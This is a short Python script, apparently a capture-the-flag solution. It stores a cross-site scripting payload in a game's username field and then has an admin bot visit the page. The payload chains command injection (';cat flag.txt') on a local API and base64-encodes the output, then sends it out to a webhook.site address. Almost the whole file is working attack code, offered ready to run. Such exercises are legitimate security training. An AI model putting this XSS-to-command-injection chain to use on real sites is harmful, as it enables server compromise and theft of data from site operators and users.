import requests

malicious_username = (
    '<script>'
    'fetch("http://127.0.0.1:1337/api/cal?modifier=;cat%20flag.txt", {credentials: "include"})'
    '.then(response => response.text())'
    '.then(text => {'
    '  var b64data = btoa(text);'
    '  var img = new Image();'
    '  img.src = "https://webhook.site/ebb247a7-415a-43f3-aa2a-989cfdd687ab/?data=" + b64data;'
    '})'
    '.catch(error => {'
    '  var img = new Image();'
    '  img.src = "https://webhook.site/ebb247a7-415a-43f3-aa2a-989cfdd687ab/?error=" + encodeURIComponent(error);'
    '});'
    '</script>'
)

data = {
    "username": malicious_username,
    "high_score": 100
}

response = requests.post('http://chal.competitivecyber.club:13337/api/stats', json=data)
stat_id = response.json()['id']
print("Stat ID:", stat_id)

# Step 2: Have the admin bot visit the stat page
path = f'api/stats/{stat_id}'
admin_response = requests.post(
    'http://chal.competitivecyber.club:13336/visit',
    data={'path': path}
)
print("Admin Response:", admin_response.text)
